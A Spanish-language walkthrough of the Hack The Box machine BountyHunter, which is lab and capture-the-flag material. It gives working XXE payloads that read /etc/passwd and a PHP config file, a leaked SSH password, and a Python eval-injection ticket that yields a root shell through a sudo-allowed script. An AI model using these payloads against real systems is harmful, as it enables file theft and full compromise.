---
tags:
  - meta/ctf
  - estado/incompleto
platform: "[[Hack the Box]]"
type: CTF
web: https://app.hackthebox.com/machines/BountyHunter
difficulty:
ip:
os:
linked:
---
# HackTheBox - BountyHunter

___

## Enumeración

### Nmap

Empezamos con un escaneo completo de puertos seguido de una segunda pasada con detección de servicios y scripts NSE únicamente sobre los puertos abiertos. Esto es más rápido que lanzar `-sC -sV` directamente sobre los 65535 puertos:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.198.241 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.198.241
```

Donde:

- `-p-` escanea los 65535 puertos TCP.
- `--min-rate=1000` fuerza un mínimo de paquetes por segundo (acelera el escaneo).
- `-T4` template de timing agresivo.
- La cadena con `grep`/`cut`/`tr`/`sed` extrae los puertos abiertos y los formatea en lista separada por comas para la segunda llamada.

> [!success] Resultado Dos puertos abiertos:
> 
> - **22/tcp** — SSH
> - **80/tcp** — Apache2

Como SSH no es un vector inicial sin credenciales, toda la atención se concentra en el servicio web del puerto 80.

### Inspección manual del sitio

La página principal pertenece a un equipo de **bug bounty hunters**. La inspección manual aporta dos datos relevantes:

- Un nombre: **John**.
- Un anuncio sobre un **Bug Bounty Tracking System** que estará disponible próximamente.
- Un formulario "Contact us" que no funciona.

Estos detalles servirán como pistas posteriores (especialmente la mención al Tracking System, que será nuestro vector de XXE).

### Fuzzing con dirsearch

Para descubrir contenido no enlazado utilizamos `dirsearch`, que es una herramienta de fuerza bruta de directorios y archivos similar en propósito a Dirbuster pero más rápida y con detección de extensiones por defecto:

```bash
python3 dirsearch.py -u http://10.129.198.241
```

Entre los resultados destaca el archivo **`db.php`**, que en condiciones normales contendría la configuración de conexión a base de datos — una pieza muy interesante si encontramos forma de leer su contenido. También aparece un directorio `/resources` que merece exploración propia:

```bash
python3 dirsearch.py -u http://10.129.198.241/resources
```

### Hallazgo en `/resources/README.txt`

Dentro de `/resources` aparece un `README.txt`. Lo leemos directamente con `curl`:

```bash
curl http://10.129.198.241/resources/README.txt
```

> [!tip] Pista clave El README menciona la existencia de una **cuenta de desarrollo de pruebas (`test`) que no requiere contraseña**.

Volviendo al formulario de login del sitio, probamos `test` como usuario con la contraseña vacía y el acceso es exitoso. Aterrizamos en una página llamada **gateway**, que únicamente contiene una línea redirigiendo a otra ruta del propio sitio: **`portal.php`**.

---

## Foothold

### Exploración del Bounty Tracking System

Siguiendo el enlace de la página gateway llegamos a `portal.php`, donde efectivamente se encuentra el formulario del **Bounty Tracking System** anticipado en la página principal. El formulario pide datos típicos de un reporte de bug bounty: título, CWE, CVSS, reward, etc.

Al enviar datos arbitrarios para observar el comportamiento, la respuesta indica que **"los datos habrían sido subidos si la base de datos estuviera disponible"**. Esta frase es muy reveladora:

- La aplicación está **eco-eando** los datos del usuario en el mensaje de error.
- Probablemente el backend está **parseando los datos antes de intentar guardarlos**, y es ahí donde podemos encontrar la vulnerabilidad.

### Interceptación con Burp Suite

Para entender qué formato usa la aplicación al enviar los datos, interceptamos la petición con Burp Suite. La petición POST se ve así:

```http
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.129.198.241
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 221
Origin: http://10.129.198.241
DNT: 1
Connection: close
Referer: http://10.129.198.241/log_submit.php
Sec-GPC: 1

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCT
x0aXRsZT5zc3M8L3RpdGxlPgoJCTxjd2U%2BZGRkPC9jd2U%2BCgkJPGN2c3M%2BZmZmPC9jdnNzPgoJCTxyZXd
hcmQ%2BZ2dnPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B
```

Hay dos cosas a destacar:

- El endpoint real es **`tracker_diRbPr00f314.php`** (no aparece en el fuzzing porque tiene un nombre poco predecible — el patrón `diRbPr00f314` parece un guiño a "Dirb Proof").
- El parámetro `data` está **doblemente codificado**: primero en URL-encoding (se ven los `%3D%3d` finales correspondientes al == de padding de Base64) y luego en Base64.

### Decodificación del payload

Decodificamos el doble encoding:

```bash
echo 'PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9Ikl<SNIP>' | base64 -d
```

> [!success] Hallazgo decisivo Los datos se envían internamente como **XML**. Esto convierte al endpoint en un objetivo natural para una **inyección XXE**.

### XXE básica: lectura de `/etc/passwd`

Construimos un payload XML con una declaración `DOCTYPE` y una entidad externa apuntando al archivo que queremos leer. La entidad se incrusta en uno de los campos del XML original (en este caso `<reward>`), de modo que el valor del archivo se reflejará allí donde la aplicación muestre nuestro input:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>test</title>
<cwe>test</cwe>
<cvss>test</cvss>
<reward>&file;</reward>
</bugreport>
```

Para enviarlo respetando el formato esperado por el servidor (Base64 dentro de URL-encoding), guardamos el XML en un archivo y lo codificamos en Base64:

```bash
cat /tmp/f.xml | base64 -w 0
```

El flag `-w 0` evita que `base64` introduzca saltos de línea cada 76 caracteres. A continuación aplicamos URL-encoding (Burp lo hace cómodamente con `Ctrl+U` sobre la selección) y reenviamos la petición.

La respuesta del servidor incluye el contenido de `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
<SNIP>
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

> [!note] Observación importante Aparece un usuario interactivo: **`development`** (UID 1000, shell `/bin/bash`). Es el candidato natural para autenticarnos por SSH si conseguimos credenciales.

### XXE con `php://filter`: lectura de `db.php`

Si intentamos leer `db.php` directamente con `file:///var/www/html/db.php`, el contenido no será visible: **PHP es un lenguaje del lado servidor**, así que el archivo se ejecutaría en lugar de devolverse como texto plano. Para evitarlo, usamos el wrapper `php://filter` con `convert.base64-encode`, que **lee el archivo crudo y lo codifica en Base64** antes de devolverlo, neutralizando cualquier interpretación:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>test</title>
<cwe>test</cwe>
<cvss>test</cvss>
<reward>&file;</reward>
</bugreport>
```

Repetimos el mismo proceso (Base64 → URL-encode → enviar por Burp). La petición resultante es de este estilo:

```http
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.129.198.241
...
Content-Length: 375
...

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWw
o8IUVOVElUWSBmaWxlIFNZU1RFTSAicGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc
291cmNlPS92YXIvd3d3L2h0bWwvZGIucGhwIj4gXT4KPGJ1Z3JlcG9ydD4KPHRpdGxlPnRlc3Q8L3RpdGxlPgog
IDxjd2U%2bdGVzdDwvY3dlPgogIDxjdnNzPnRlc3Q8L2N2c3M%2bCiAgPHJld2FyZD4mZmlsZTs8L3Jld2FyZD4
KPC9idWdyZXBvcnQ%2bCg%3d%3d
```

La respuesta contiene el archivo `db.php` codificado en Base64. Lo decodificamos:

```bash
echo 'PD9waHAKLy8gVE9ETyAtPiBJbXBsZ<SNIP>' | base64 -d
```

> [!success] Credenciales filtradas El contenido de `db.php` revela credenciales hardcodeadas dentro del código PHP.

### Password spraying y acceso por SSH

Probamos la contraseña obtenida contra los usuarios humanos identificados en `/etc/passwd`. El único candidato real con shell interactiva (además de `root`) es `development`, y la prueba tiene éxito:

```bash
ssh development@10.129.198.241
# password: m19RoAU0hP41A1sTsq6K
```

> [!success] User flag La flag de usuario está en `/home/development/user.txt`.

---

## Escalada de privilegios

### Reconocimiento local: `Contract.txt`

Tras una enumeración básica desde la sesión SSH, en el directorio home de `development` aparece un archivo curioso: **`Contract.txt`**.

```bash
cat contract.txt
```

El contenido habla de:

- Un **contrato de John con Skytrain Inc**.
- Una mención a un evento `rm -rf` (un detalle narrativo sobre una operación destructiva).
- La existencia de una **herramienta interna** que sugieren investigar.

### Localización de la herramienta interna

Enumerando el sistema de archivos aparece una carpeta de proyecto en **`/opt/skytrain_inc/`**:

```bash
ls -la /opt/skytrain_inc/
```

El contenido relevante es:

- **`ticketValidator.py`** — un script de Python.
- **`invalid_tickets/`** — una carpeta con ejemplos de tickets inválidos, útiles para entender el formato esperado.

### Revisión de código del validador

Auditando `ticketValidator.py` aparece una función `eval()` aplicada sobre input controlado por el usuario. Este es el núcleo de la vulnerabilidad:

```python
validationNumber = eval(x.replace("**", ""))
```

> [!danger] Función peligrosa `eval()` ejecuta cualquier expresión de Python que reciba como string. Si un atacante controla `x`, puede ejecutar **código arbitrario**.

El detalle del `replace("**", "")` es importante: el script **elimina los caracteres `**` antes de evaluar**, lo que sugiere que `**` se usa como delimitador o marcador en el formato de ticket esperado, no como una protección.

Además del `eval`, el script aplica dos comprobaciones lógicas que tenemos que cumplir para que el flujo llegue al punto vulnerable:

```python
if int(ticketCode) % 7 == 4:
    ...
if validationNumber > 100:
    ...
```

Lo que se traduce en dos restricciones:

1. El **`ticketCode`** debe ser un número entero que, dividido por 7, dé **resto 4**.
2. El resultado de la expresión evaluada (**`validationNumber`**) debe ser mayor que **100**.

### Verificación de privilegios con `sudo -l`

Construir un ticket malicioso solo es útil si el script lo ejecuta alguien con más privilegios que nosotros. Comprobamos qué podemos correr con `sudo`:

```bash
sudo -l
```

> [!success] Resultado El usuario `development` puede ejecutar **`/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py`** como `root`, sin contraseña.

Esto cierra el círculo: podemos invocar el validador como root, y el validador hace `eval()` sobre nuestra entrada. Por lo tanto, **podemos ejecutar Python arbitrario como root**.

### Construcción del ticket malicioso

Necesitamos un ticket que:

1. Pase la comprobación `% 7 == 4` (el `ticketCode` que el script lee primero).
2. Tenga una expresión que se evalúe a un número > 100 **y** que ejecute código del sistema.

Para el primer punto, usamos la fórmula **`x = 7y + 4`**, que por construcción siempre da resto 4 al dividirlo por 7. Por ejemplo, con `y = 25`: `7 * 25 + 4 = 179`.

Para el segundo punto, aprovechamos que `eval` puede importar módulos sobre la marcha con `__import__('os')` y ejecutar comandos con `system()`. La expresión completa que vamos a inyectar combina:

- Una operación aritmética que da > 100 (`179 + 25 == 204`, que evalúa a `True`).
- Un `and` con la llamada a `system()`, aprovechando que **`os.system()` devuelve `0` en Linux cuando el comando se ejecuta correctamente**, y `0 == True` es `False` — pero a `eval` no le importa el valor lógico final, solo necesitamos que la expresión sea sintácticamente válida y que el comando se ejecute como efecto colateral.

Recordando el `replace("**", "")`, los `**` que escribamos al principio del campo serán eliminados antes del `eval`, así que se usan como prefijo de delimitador del formato.

Creamos el ticket en `/tmp` con el siguiente contenido:

```
# Skytrain Inc
## Ticket to Mars
__Ticket Code:__
**179+ 25 == 204 and __import__('os').system('id') == True
```

### Ejecución y prueba con `id`

Lanzamos el validador como root, apuntándolo a nuestro ticket:

```bash
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

La salida confirma que `id` se ejecuta con privilegios de `root`. La inyección es funcional.

### Shell de root

Sustituimos `id` por `/bin/bash` para abrir una shell interactiva en lugar de un comando one-shot:

```
# Skytrain Inc
## Ticket to Mars
__Ticket Code:__
**179+ 25 == 204 and __import__('os').system('/bin/bash') == True
```

Volvemos a ejecutar el validador con `sudo` y, al llegar al `eval`, se lanza una shell de Bash con privilegios de root.

> [!success] Root flag La flag de root está en `/root/root.txt`.

---

## Resumen del ataque

| Etapa                    | Técnica                                                                       | Indicador clave                                     | Usuario resultante |
| ------------------------ | ----------------------------------------------------------------------------- | --------------------------------------------------- | ------------------ |
| Enumeración de red       | Nmap (`-p-` + `-sC -sV`)                                                      | SSH (22) y Apache (80)                              | —                  |
| Enumeración web          | dirsearch + lectura manual                                                    | `db.php` y `/resources/README.txt`                  | —                  |
| Acceso a portal          | Login con `test` sin contraseña                                               | README revela cuenta de pruebas                     | `test` (web)       |
| Detección XXE            | Interceptación con Burp + decode Base64/URL                                   | El payload es XML                                   | —                  |
| Lectura de archivos      | XXE con entidad `file://`                                                     | Contenido de `/etc/passwd`                          | —                  |
| Filtrado de credenciales | XXE con `php://filter/convert.base64-encode`                                  | `db.php` codificado en Base64                       | —                  |
| Foothold                 | Password spraying SSH con la pass de `db.php`                                 | Login exitoso como `development`                    | `development`      |
| Recon local              | Lectura de `Contract.txt` y `/opt/skytrain_inc/`                              | `ticketValidator.py` con `eval`                     | —                  |
| Análisis de código       | Detección de `eval(x.replace("**",""))` y restricciones (`% 7 == 4`, `> 100`) | Inyección de Python posible                         | —                  |
| Verificación de privesc  | `sudo -l`                                                                     | `python3.8 ticketValidator.py` autorizado como root | —                  |
| Escalada                 | Ticket con `__import__('os').system('/bin/bash')`                             | Shell interactiva como root                         | `root`             |

---

## Bandera(s)

> [!FLAG] `flag{user}`
^bandera

> [!FLAG] `flag{root}`
^bandera